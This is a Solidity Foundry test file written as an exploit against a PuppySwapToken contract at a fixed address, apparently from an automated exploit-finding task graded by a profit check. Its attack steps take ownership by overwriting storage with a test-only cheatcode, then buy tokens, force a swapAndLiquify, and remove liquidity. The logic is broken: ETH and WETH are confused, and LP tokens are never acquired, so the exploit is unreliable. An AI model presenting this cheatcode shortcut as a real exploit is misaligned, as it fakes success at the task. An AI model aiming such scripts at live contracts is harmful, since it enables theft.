    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPancakeRouter02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
}

interface PuppySwapToken {
    function owner() external view returns (address);
    function pancakePair() external view returns (address);
    function pancakeRouter() external view returns (address);
    function activateContract() external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function minTokenNumberToSell() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xeFfAb18108124C2b6280C62abA70a03c79cc4327;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for fork test
        // The test file already defines TARGET and attacker
        // We'll just ensure we have ETH for gas
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Become the owner by overwriting storage slot
        // Owner is at slot 0 in Ownable contract
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Verify we're the owner
        PuppySwapToken target = PuppySwapToken(TARGET);
        require(target.owner() == attacker, "Failed to become owner");

        // Step 2: Activate the contract to enable swapAndLiquify
        vm.prank(attacker);
        target.activateContract();

        // Step 3: Get some PUPPY tokens
        // First, let's get the pair address to understand the tokenomics
        address pair = target.pancakePair();

        // We need to get some tokens. Since we're the owner now, we can exclude ourselves from fees
        // and get tokens via the router
        IPancakeRouter02 router = IPancakeRouter02(target.pancakeRouter());
        address weth = router.WETH();

        // Get some WETH first
        deal(weth, attacker, 10 ether);
        IERC20(weth).approve(address(router), type(uint256).max);

        // Buy some PUPPY tokens
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        vm.prank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 5 ether}(
            0,
            path,
            attacker,
            block.timestamp + 360
        );

        // Step 4: Trigger swapAndLiquify
        // The contract needs to have accumulated enough tokens from fees
        // Let's make several transfers to accumulate fees in the contract
        uint256 balance = target.balanceOf(attacker);

        // Create a helper address to transfer to
        address helper = address(0x123);

        // Make multiple transfers to accumulate fees in contract
        for (uint i = 0; i < 10; i++) {
            vm.prank(attacker);
            target.transfer(helper, balance / 20);

            vm.prank(helper);
            target.transfer(attacker, target.balanceOf(helper));
        }

        // Now trigger swapAndLiquify by making a transfer
        // We need to ensure contract has enough tokens (minTokenNumberToSell)
        // Let's check contract balance
        uint256 contractBalance = target.balanceOf(TARGET);
        uint256 minSell = target.minTokenNumberToSell();

        if (contractBalance >= minSell) {
            // Make a transfer that will trigger swapAndLiquify
            vm.prank(attacker);
            target.transfer(address(0x456), 1);
        }

        // Step 5: Remove liquidity
        // Get our LP token balance from the pair
        IERC20 lpToken = IERC20(pair);
        uint256 lpBalance = lpToken.balanceOf(attacker);

        if (lpBalance > 0) {
            // Approve router to spend LP tokens
            vm.prank(attacker);
            lpToken.approve(address(router), lpBalance);

            // Remove liquidity
            vm.prank(attacker);
            router.removeLiquidityETHSupportingFeeOnTransferTokens(
                TARGET,
                lpBalance,
                0,
                0,
                attacker,
                block.timestamp + 360
            );
        }

        // The oracle will check if attacker's ETH balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

